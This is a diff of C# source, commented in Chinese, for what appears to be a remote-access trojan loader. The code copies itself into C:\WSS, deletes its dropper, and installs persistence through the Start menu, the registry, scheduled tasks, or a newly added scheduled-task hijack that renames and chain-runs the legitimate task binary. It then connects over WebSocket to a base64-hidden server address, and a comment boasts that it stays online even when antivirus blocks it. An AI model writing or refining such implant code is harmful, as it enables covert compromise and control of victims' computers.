@@ -1,14 +1,8 @@
 using System;
 using System.Collections.Generic;
-using System.Linq;
-using System.Text;
-using System.Threading.Tasks;
-using WebSocketSharp;
-using System.Threading;
 using System.IO;
-using System.Diagnostics;
-using System.Windows.Forms;
-using TaskScheduler;
+using System.Text;
+using System.Threading;
 
 namespace websocket
 {
@@ -26,48 +20,62 @@ namespace websocket
             return false;
         }
 
+        public static string RootPath = @"C:\WSS\";//要生成的路径
+        public static string ServiceName = "WSService";//要生成的文件名
+        public static string destinationPath = RootPath + ServiceName + ".exe";//要生成的完整路径
+        public static int startupCode = 886;//0:开始菜单启动 1:注册表启动 2:计划任务启动 3:计划任务劫持启动 886:不自启动  [会被360拦截导致自启动失效 不过仍然会上线]
+        public static string changeName = "_UpdateWs";//被劫持文件添加后缀
+        public static string ip = "MTI3LjAuMC4x";//BASE64加密服务端IP
+        public static string pathCreate;
+
+
         static void Main(string[] args)
         {
-            string RootPath = @"C:\WSS\";//要释放的路径
-            string ServiceName = "WSService";//要生成的文件名
-            int startupCode = 2;//0:开始菜单启动 1:注册表启动 2:计划任务启动 [会被360拦截导致自启动失效 不过仍然会上线]
-            string ip = "MTI3LjAuMC4x";//BASE64加密服务端IP
-
-            if (!Directory.Exists(RootPath))//如果不存在就创建
+            if (!Directory.Exists(RootPath))//如果不存在且不为劫持启动就创建
             {
                 Directory.CreateDirectory(RootPath);
             }
 
             if (!IsProcessExist(ServiceName))
             {
-                string path = System.Diagnostics.Process.GetCurrentProcess().MainModule.FileName;
-                string destinationPath = RootPath + ServiceName + ".exe";
-                //如果不存在就生成
-                if (!System.IO.File.Exists(destinationPath))
-                {
-                    //拷贝到特定目录
-                    FileInfo fi = new FileInfo(path);
-                    if (!fi.Exists)
-                    {
-                        fi.CreateText();
-                    }
-                    fi.CopyTo(destinationPath);
-                }
+                pathCreate = System.Diagnostics.Process.GetCurrentProcess().MainModule.FileName;
+
                 //记录生成器路径
                 FileStream fs1 = new FileStream(RootPath + "path.ini", FileMode.Create, FileAccess.Write);
                 StreamWriter sw1 = new StreamWriter(fs1);
-                sw1.WriteLine(path);
+                sw1.WriteLine(pathCreate);
                 sw1.Close();
                 fs1.Close();
-                //运行目标
-                MyWindowsCmd myWindowsCmd = new MyWindowsCmd();
-                myWindowsCmd.StartCmd();
-                myWindowsCmd.RunCmd(destinationPath);
-                myWindowsCmd.WaitForExit();
-                myWindowsCmd.StopCmd();
-                //设定目录启动项
-                StartupWay startupWay = new StartupWay();
-                startupWay.doStartUpWay(startupCode, RootPath, ServiceName);
+
+                if (startupCode == 3)
+                {
+                    //设定启动项
+                    StartupWay startupWay = new StartupWay();
+                    startupWay.doStartUpWay(startupCode, pathCreate, ServiceName, changeName);//传送生成器所在位置
+                }
+                else
+                {
+                    //如果不存在就生成
+                    if (!System.IO.File.Exists(destinationPath))
+                    {
+                        //拷贝到特定目录
+                        FileInfo fi = new FileInfo(pathCreate);
+                        if (!fi.Exists)
+                        {
+                            fi.CreateText();
+                        }
+                        fi.CopyTo(destinationPath);
+                    }
+                    //运行目标
+                    MyWindowsCmd myWindowsCmd = new MyWindowsCmd();
+                    myWindowsCmd.StartCmd();
+                    myWindowsCmd.RunCmd(destinationPath);
+                    myWindowsCmd.WaitForExit();
+                    myWindowsCmd.StopCmd();
+                    //设定启动项
+                    StartupWay startupWay = new StartupWay();
+                    startupWay.doStartUpWay(startupCode, RootPath, ServiceName, changeName);
+                }
             }
             else
             {
@@ -81,6 +89,10 @@ namespace websocket
                 {
                     string path = File.ReadAllText(RootPath + "path.ini", Encoding.Default);
                     string delCreate = "del " + path;
+                    if (startupCode == 3)
+                    {
+                        delCreate += " & rmdir /s /q " + RootPath;
+                    }
                     string delIni = "del " + RootPath + "path.ini";
                     MyWindowsCmd myWindowsCmd = new MyWindowsCmd();
                     myWindowsCmd.StartCmd();
@@ -88,7 +100,19 @@ namespace websocket
                     myWindowsCmd.WaitForExit();
                     myWindowsCmd.StopCmd();
                 }
-                
+                if (startupCode == 3)
+                {
+                    string trueTaskExe = System.Diagnostics.Process.GetCurrentProcess().MainModule.FileName.Replace(".exe", "") + changeName + ".exe";
+                    if (File.Exists(trueTaskExe))//真计划任务文件是否存在
+                    {
+                        //运行真文件
+                        MyWindowsCmd myWindowsCmd = new MyWindowsCmd();
+                        myWindowsCmd.StartCmd();
+                        myWindowsCmd.RunCmd(trueTaskExe);
+                        myWindowsCmd.WaitForExit();
+                        myWindowsCmd.StopCmd();
+                    }
+                }
                 Base64Tools base64Tools = new Base64Tools();
                 string url = "ws://" + base64Tools.base64decode(ip) + ":7272";
 
@@ -110,8 +134,20 @@ namespace websocket
             }
         }
 
-
-
+        public static List<string> GetFileListWithExtend(DirectoryInfo directory, string pattern)
+        {
+            List<string> pathList = new List<string>();
+            string result = String.Empty;
+            if (directory.Exists || pattern.Trim() != string.Empty)
+            {
+                foreach (FileInfo info in directory.GetFiles(pattern))
+                {
+                    result = info.FullName.ToString();
+                    pathList.Add(result);
+                }
+            }
+            return pathList;
+        }
     }
 
 }
